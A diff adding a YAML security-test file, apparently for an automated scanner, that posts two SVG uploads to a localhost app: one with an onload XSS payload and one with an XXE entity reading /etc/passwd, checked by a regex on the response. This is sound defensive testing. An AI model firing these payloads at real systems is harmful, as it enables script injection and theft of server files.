@@ -1,0 +1,42 @@
+name: "Upload — Universel (SVG XSS & XXE)"
+variables:
+  base_url: "http://localhost:8080"
+  canary: "MOWING_SVG_{{rand_int}}"
+defaults:
+  read_timeout: 10
+  verify: false
+  follow_redirects: true
+
+tests:
+  - id: svg-xss-reflected
+    name: "SVG avec XSS embarqué (déclenchement au rendu)"
+    severity: medium
+    request:
+      method: POST
+      path: "/upload/avatar"
+      multipart:
+        - name: "avatar"
+          filename: "avatar.svg"
+          content: |
+            <svg xmlns="http://www.w3.org/2000/svg" onload="alert('{{canary}}')"/>
+          content_type: "image/svg+xml"
+    assert:
+      - status: 200
+      - body_contains: "{{canary}}" # Si l'application reflète le nom ou le contenu
+
+  - id: svg-xxe-file-read
+    name: "SVG avec XXE pour lecture de fichier (ex: /etc/passwd)"
+    severity: high
+    request:
+      method: POST
+      path: "/upload/image"
+      multipart:
+        - name: "image"
+          filename: "xxe.svg"
+          content: |
+            <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+            <svg width="100" height="100">&xxe;</svg>
+          content_type: "image/svg+xml"
+    assert:
+      - status: 200
+      - body_regex: "(?i)(root:.*:0:0:|daemon:|Administrator)"
